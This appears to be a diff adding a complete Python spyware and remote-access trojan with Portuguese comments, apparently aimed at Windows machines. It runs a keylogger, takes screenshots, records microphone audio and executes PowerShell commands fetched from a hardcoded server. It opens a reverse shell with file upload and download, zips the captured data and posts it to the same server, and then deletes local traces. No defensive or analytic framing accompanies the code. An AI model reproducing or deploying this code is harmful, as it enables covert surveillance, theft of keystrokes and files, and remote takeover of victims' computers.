@@ -1,0 +1,414 @@
+from threading import Thread, Event
+import pyscreenshot as pys
+from pynput.keyboard import Listener, Key
+import requests
+from time import sleep
+import os
+import socket
+import subprocess
+import time
+import pyautogui
+import zipfile
+import pyaudio
+import wave
+from bs4 import BeautifulSoup
+from datetime import datetime
+
+
+site = 'http://chantreticket.com'
+
+#site = 'http://127.0.0.1'
+
+
+session = requests.Session()
+session.headers.update({'User-Agent': 'Custom-Agent/1.0'})
+
+
+class Status:
+
+    def __init__(self):
+        self.stop_event = Event()
+
+    def update_status(self):
+
+        user = os.getenv('USER') or os.getenv('USERNAME') or "UnknownUser"
+        status = 1
+
+        try:
+            response = session.get(
+                f'{site}/oblivion/status.php?status={status}&user={user}',verify=False)
+            # print(f"Status atualizado com sucesso: {response.text}")
+        except requests.RequestException as e:
+            print(f"Erro ao atualizar o status: {e}")
+
+    def start_status_thread(self):
+        # Inicia a thread de atualização do status
+        thread = Thread(target=self._status_loop)
+        thread.daemon = True  # Thread encerrará automaticamente com o programa
+        thread.start()
+
+    def _status_loop(self):
+        # Loop que envia o status periodicamente
+        while not self.stop_event.is_set():
+            self.update_status()
+            time.sleep(7)
+
+    def stop_status_thread(self):
+        # Sinaliza para a thread parar
+        self.stop_event.set()
+
+    def update_status(self):
+        # Obtém o nome do usuário
+        user = os.getenv('USER') or os.getenv('USERNAME') or "UnknownUser"
+
+        # Define o status (1 = Online)
+        status = 1
+
+        # Faz a requisição HTTP para atualizar o status no servidor
+        try:
+            response = session.get(
+                f'{site}/oblivion/status.php?status={status}&user={user}',verify=False)
+            # print(f"Status atualizado com sucesso: {response.text}")
+        except requests.RequestException as e:
+            print(f"Erro ao atualizar o status: {e}")
+
+
+# Estágio 1: INICIO DE TUDO
+print("CREATED THE FIRST ITEM : 'log.txt' ")
+print()
+
+os.system('powershell -Command "Invoke-RestMethod -Uri https://ipinfo.io | Out-File -FilePath info.txt -Encoding utf8"')
+
+# Estágio 3: SCRAP PARA A SHELL
+
+
+class Scrap:
+    def scrap(self):
+        # Faz a requisição para a nova URL
+        r = session.get(f'{site}/oblivion/send.txt', verify=False)
+
+        # Divide o conteúdo do arquivo em IP e porta
+        data = r.text.strip()  # Remove espaços ou quebras de linha adicionais
+        ip, port = data.split(';')  # Divide usando o delimitador ";"
+
+        return ip, port
+
+
+def pegar_ip():
+    try:
+        link = "https://icanhazip.com/"
+        r = session.get(link, verify=False).text
+        return r.strip()
+    except requests.RequestException:
+        return "0"
+
+
+def comando():
+    try:
+        link = f"{site}/oblivion/comando.txt"
+        r = session.get(link, verify=False).text.strip()
+        comando_executado = os.popen(f'powershell {r}').read()
+        with open("comando.txt", "w", encoding='utf-8') as arquivo:
+            arquivo.write(comando_executado)
+        return "Comando executado e saída salva em comando.txt."
+    except requests.RequestException:
+        return "Erro ao acessar o link."
+    except Exception as e:
+        return f"Erro: {str(e)}"
+
+
+def pega_user():
+    return os.getlogin()
+
+
+def inicio():
+    with open("log.txt", "w") as log_file:
+        log_file.write("inicio\n")
+    print("")
+    sleep(1)
+    print("")
+
+
+def screenshot():
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save(r'screenshot.jpg')
+
+
+def arq_existe(arq):
+    return os.path.isfile(arq)
+
+
+def limpar_log(log):
+    with open(log, "w") as file:
+        file.write("")
+
+
+def write_log(text):
+    with open("log.txt", "a") as file_log:
+        file_log.write(str(text))
+
+
+def verificar_log(key):
+    try:
+        write_log(key.char)
+    except AttributeError:
+        if key == Key.enter:
+            write_log(" < ENTER > \n\n")
+        elif key == Key.space:
+            write_log(" ")
+        elif key == Key.backspace:
+            write_log("< BACKSPACE >")
+        else:
+            write_log(" <> ")
+    if key == Key.esc:
+        return False
+
+
+def key_logger(stop_event):
+    with Listener(on_release=verificar_log) as listener:
+        while not stop_event.is_set():
+            listener.join()
+
+
+scrap = Scrap()
+
+
+def connect_to_server():
+    try:
+        ngrok_ip, ngrok_port = scrap.scrap()
+        global host, port, s
+        host = str(ngrok_ip)
+        port = int(ngrok_port)
+        print(ngrok_ip, ngrok_port)
+        s = socket.socket()
+        s.connect((host, port))
+        s.send(str.encode(os.getcwd() + '> '))
+        receive_commands()
+    except:
+        time.sleep(5)
+        connect_to_server()
+
+# Estágio 4: RODA A SHELL EM LOOP
+
+
+def receive_commands():
+    while True:
+        data = s.recv(1024)
+        if data[:3].decode("utf-8") == 'cd ':
+            try:
+                os.chdir(data[3:].decode("utf-8"))
+                s.send(str.encode(os.getcwd() + '> '))
+            except FileNotFoundError:
+                s.send(str.encode("Arquivo nao encontrado"))
+                s.send(str.encode(os.getcwd() + '> '))
+        elif data[:8].decode("utf-8") == 'download':
+            file_name = data[9:].decode("utf-8")
+            try:
+                with open(file_name, 'rb') as f:
+                    sending = True
+                    while sending:
+                        file_to_send = f.read(1024)
+                        if file_to_send == b'':
+                            f.close()
+                            time.sleep(0.3)
+                            s.send(str.encode("EOFEOFEOFEOFEOF"))
+                            s.send(str.encode(os.getcwd() + '> '))
+                            sending = False
+                        else:
+                            s.send(file_to_send)
+            except FileNotFoundError:
+                s.send(str.encode("Arquivo nao encontrado"))
+                time.sleep(0.3)
+                s.send(str.encode(os.getcwd() + '> '))
+        elif data[:6].decode("utf-8") == 'upload':
+            down_file = data[7:].decode("utf-8")
+            receive_file = True
+            with open(down_file, 'wb') as f:
+                while receive_file:
+                    data = s.recv(1024)
+                    if data.endswith(b"EOFEOFEOFEOFEOF"):
+                        data = data[:-15]
+                        f.write(data)
+                        f.close()
+                        s.send(str.encode(os.getcwd() + '> '))
+                        receive_file = False
+                    else:
+                        f.write(data)
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes, "utf-8", errors='ignore')
+            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+
+        while not data:
+            connect_to_server()
+
+
+def main_shell():
+    connect_to_server()
+
+# Estágio 5: GRAVA O AUDIO DE 8S
+
+
+def gravar_audio(duracao, arquivo_saida):
+
+    try:
+
+        formato = pyaudio.paInt16
+        canais = 1
+        taxa = 44100
+        chunk = 1024
+        gravador = pyaudio.PyAudio()
+        stream = gravador.open(format=formato, channels=canais,
+                               rate=taxa, input=True,
+                               frames_per_buffer=chunk)
+        print("Gravando...")
+        frames = []
+        for i in range(0, int(taxa / chunk * duracao)):
+            data = stream.read(chunk)
+            frames.append(data)
+        print("Gravação finalizada.")
+        stream.stop_stream()
+        stream.close()
+        gravador.terminate()
+
+        with wave.open(arquivo_saida, 'wb') as arquivo:
+            arquivo.setnchannels(canais)
+            arquivo.setsampwidth(gravador.get_sample_size(formato))
+            arquivo.setframerate(taxa)
+            arquivo.writeframes(b''.join(frames))
+
+    except:
+        print('ERRO - Prosseguindo')
+        pass
+
+# Estágio 6: ZIP DOS ARQUIVOS E ENVIO VIA URL
+
+
+def enviar_zip_via_url(zip_filename):
+    try:
+        with open(zip_filename, 'rb') as zip_file:
+            response = session.post(
+                f"{site}/oblivion/index.php", verify=False,
+                files={'zip_file': zip_file},
+                data={'user': pega_user(), 'ip': pegar_ip()}
+            )
+            if response.status_code == 200:
+                print(">>> ZIP enviado com sucesso via URL <<<")
+            else:
+                print(f"Erro ao enviar o arquivo. Status: {
+                      response.status_code}")
+    except Exception as e:
+        print(f"Erro ao enviar o ZIP via URL: {e}")
+
+
+def zip():
+    try:
+        timestamp = datetime.now().strftime("%M%S")
+        zip_filename = f"final_{timestamp}.zip"
+
+        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as z:
+            if arq_existe('screenshot.jpg'):
+                z.write('screenshot.jpg')
+            if arq_existe('log.txt'):
+                z.write('log.txt')
+            if arq_existe('audio.wav'):
+                z.write('audio.wav')
+            if arq_existe('info.txt'):
+                z.write('info.txt')
+            if arq_existe('comando.txt'):
+                z.write('comando.txt')
+            if arq_existe(r'C:\Users\Public\pasta.zip'):
+                z.write(r'C:\Users\Public\pasta.zip', arcname='pasta.zip')
+
+        enviar_zip_via_url(zip_filename)
+    except Exception as e:
+        print(f"Erro ao processar o ZIP: {e}")
+
+# Estágio 7: CICLO DA REPETIÇÃO
+
+
+def nucleo_inicio():
+    inicio()
+
+
+def nucleo_one():
+    print("process 1 > Started: KEYLOGGER. ")
+    stop_event = Event()
+    thread = Thread(target=key_logger, args=(stop_event,))
+    thread.start()
+    return stop_event
+
+
+def nucleo_two():
+    print("process 2 > Started: SCREENSHOT. ")
+    sleep(1)
+    screenshot()
+
+
+def nucleo_five():
+    print("Process 3 > Started: SOUND ")
+    gravar_audio(10, 'audio.wav')
+
+    try:
+        response = session.get(
+            f'{site}/oblivion/tempo.txt', verify=False)
+        response.raise_for_status()
+        tempo_envio_zip = int(response.text.strip())
+        print(f"Aguardando: {tempo_envio_zip} segundos")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro ao acessar o arquivo tempo.txt: {e}")
+        return
+    except ValueError as e:
+        print(f"Erro ao converter o valor recebido em número: {e}")
+        return
+
+    sleep(tempo_envio_zip)
+
+
+def nucleo_four():
+    print("Process 4 > Started: ZIP files ")
+    zip()
+    sleep(3)
+    os.system('del final*')
+    os.system('del audio*')
+    os.system('del *.txt')
+    os.system('del *.jpg')
+
+
+def nucleo_six():
+    comando()
+
+
+def nucleo_seven():
+    status_instance = Status()
+    # Envia status periodicamente em uma thread separada
+    status_instance.start_status_thread()
+
+# FUNÇÃO DA SEQUENCIA
+
+
+def ciclo_completo(stop_event):
+    nucleo_seven()
+    nucleo_six()
+    nucleo_inicio()
+    nucleo_two()
+    nucleo_five()
+    nucleo_four()
+    stop_event.set()
+
+
+# EXECUTA A SHELL EM TRHEAD SEPARADO
+shell_thread = Thread(target=main_shell)
+shell_thread.daemon = True
+shell_thread.start()
+
+# INICIA O KEYLOGGER E MANTÉM O EVENTO
+keylogger_stop_event = nucleo_one()
+
+# EXECUTA O LOOP
+while True:
+    ciclo_completo(keylogger_stop_event)
+    sleep(5)
+    keylogger_stop_event = nucleo_one()
